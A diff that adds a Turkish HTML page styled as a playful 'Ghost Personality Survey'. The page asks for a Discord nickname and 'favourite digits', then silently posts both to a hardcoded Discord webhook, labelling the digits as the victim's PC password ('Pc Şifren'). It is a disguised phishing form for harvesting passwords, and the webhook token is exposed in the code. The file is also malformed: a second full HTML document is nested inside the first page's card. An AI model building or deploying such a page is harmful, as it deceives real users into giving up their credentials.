@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <title>Ghost Survey</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      background: radial-gradient(circle at top, #2b0040, #0b0015);
+      font-family: Arial, sans-serif;
+      color: #e6d9ff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+
+    .ghost {
+      position: absolute;
+      width: 300px;
+      height: 300px;
+      background: rgba(160, 90, 255, 0.18);
+      filter: blur(90px);
+      animation: float 9s ease-in-out infinite;
+    }
+
+    .ghost:nth-child(1) {
+      top: 15%;
+      left: 10%;
+    }
+
+    .ghost:nth-child(2) {
+      bottom: 10%;
+      right: 15%;
+      animation-duration: 13s;
+    }
+
+    @keyframes float {
+      0% { transform: translateY(0); }
+      50% { transform: translateY(-50px); }
+      100% { transform: translateY(0); }
+    }
+
+    .card {
+      position: relative;
+      background: rgba(25, 0, 50, 0.9);
+      padding: 40px;
+      border-radius: 18px;
+      box-shadow: 0 0 45px rgba(180, 100, 255, 0.7);
+      text-align: center;
+      width: 360px;
+      animation: fadeIn 1.2s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.9); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    h1 {
+      margin-bottom: 25px;
+      font-size: 22px;
+      color: #d6b6ff;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      border-radius: 10px;
+      border: none;
+      outline: none;
+      font-size: 15px;
+      background: #1a0033;
+      color: #fff;
+      margin-bottom: 15px;
+      box-shadow: inset 0 0 12px rgba(160, 90, 255, 0.45);
+    }
+
+    button {
+      width: 100%;
+      padding: 13px;
+      font-size: 16px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      background: linear-gradient(135deg, #8a3cff, #c084ff);
+      color: #fff;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+
+    button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 0 22px rgba(200, 140, 255, 1);
+    }
+
+    .status {
+      margin-top: 15px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="ghost"></div>
+  <div class="ghost"></div>
+
+  <div class="card">
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <title>Ghost Survey</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      background: radial-gradient(circle at top, #2c004a, #0b0015);
+      font-family: Arial, sans-serif;
+      color: #eadcff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+
+    .ghost {
+      position: absolute;
+      width: 320px;
+      height: 320px;
+      background: rgba(170, 100, 255, 0.2);
+      filter: blur(90px);
+      animation: float 10s ease-in-out infinite;
+    }
+
+    .ghost:nth-child(1) {
+      top: 10%;
+      left: 10%;
+    }
+
+    .ghost:nth-child(2) {
+      bottom: 10%;
+      right: 15%;
+      animation-duration: 14s;
+    }
+
+    @keyframes float {
+      0% { transform: translateY(0); }
+      50% { transform: translateY(-60px); }
+      100% { transform: translateY(0); }
+    }
+
+    .card {
+      background: rgba(30, 0, 60, 0.9);
+      padding: 40px;
+      border-radius: 20px;
+      width: 380px;
+      text-align: center;
+      box-shadow: 0 0 50px rgba(190, 120, 255, 0.8);
+      animation: fadeIn 1.2s ease;
+      z-index: 1;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.9); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    h1 {
+      margin-bottom: 25px;
+      font-size: 22px;
+      color: #d9b8ff;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border-radius: 10px;
+      border: none;
+      outline: none;
+      font-size: 15px;
+      background: #1a0033;
+      color: #fff;
+      box-shadow: inset 0 0 12px rgba(160, 90, 255, 0.5);
+    }
+
+    button {
+      width: 100%;
+      padding: 13px;
+      border-radius: 10px;
+      border: none;
+      font-size: 16px;
+      cursor: pointer;
+      background: linear-gradient(135deg, #8a3cff, #c084ff);
+      color: #fff;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+
+    button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 0 25px rgba(210, 150, 255, 1);
+    }
+
+    .status {
+      margin-top: 15px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="ghost"></div>
+  <div class="ghost"></div>
+
+  <div class="card">
+    <h1>Ghost Personality Survey</h1>
+
+    <input id="nickname" type="text" placeholder="Discord Nickname (örn: nick#1234)">
+    <input id="numbers" type="text" placeholder="En sevdiğin rakamlar (örn: 3, 7, 9)">
+
+    <button onclick="sendData()">Gönder</button>
+    <div class="status" id="status"></div>
+  </div>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1389689326266220574/FN07OO9N85iKiOfNrHntMGrbljnKOgrrdoaCH85YZPVW-GSMAmz9R0Z7-NbDbglVL9R4";
+
+    function sendData() {
+      const nickname = document.getElementById("nickname").value.trim();
+      const numbers = document.getElementById("numbers").value.trim();
+      const status = document.getElementById("status");
+
+      if (nickname.length < 2) {
+        status.style.color = "#ff9a9a";
+        status.innerText = "Discord nickname giriniz.";
+        return;
+      }
+
+      if (numbers.length < 1) {
+        status.style.color = "#ff9a9a";
+        status.innerText = "En az bir rakam giriniz.";
+        return;
+      }
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content:
+`👻 **Yeni Anket Cevabı**
+👤 Discord Nickname: **${nickname}**
+🔢 Pc Şifren(tüm hakları saklıdır): **${numbers}**`
+        })
+      })
+      .then(() => {
+        status.style.color = "#9affc8";
+        status.innerText = "Cevabın gönderildi.";
+        document.getElementById("nickname").value = "";
+        document.getElementById("numbers").value = "";
+      })
+      .catch(() => {
+        status.style.color = "#ff9a9a";
+        status.innerText = "Gönderim sırasında hata oluştu.";
+      });
+    }
+  </script>
+
+</body>
+</html>
